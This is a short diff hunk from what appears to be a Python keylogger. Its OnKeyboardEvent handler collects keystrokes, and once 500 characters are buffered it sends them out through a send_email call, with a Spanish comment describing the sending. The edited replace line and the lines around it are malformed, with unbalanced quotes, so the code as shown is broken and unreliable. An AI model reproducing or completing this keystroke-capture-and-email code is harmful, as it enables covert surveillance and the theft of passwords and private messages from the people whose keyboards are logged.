@@ -67,7 +67,7 @@ def OnKeyboardEvent(event):
 
         elif  count == 500:
             #Envia los ultimos 500 caracteres
-            capturado = buffer[-500:].replace("
+            capturado = buffer[-500:].replace("")
 ","
 ")
             send_email(capturado)
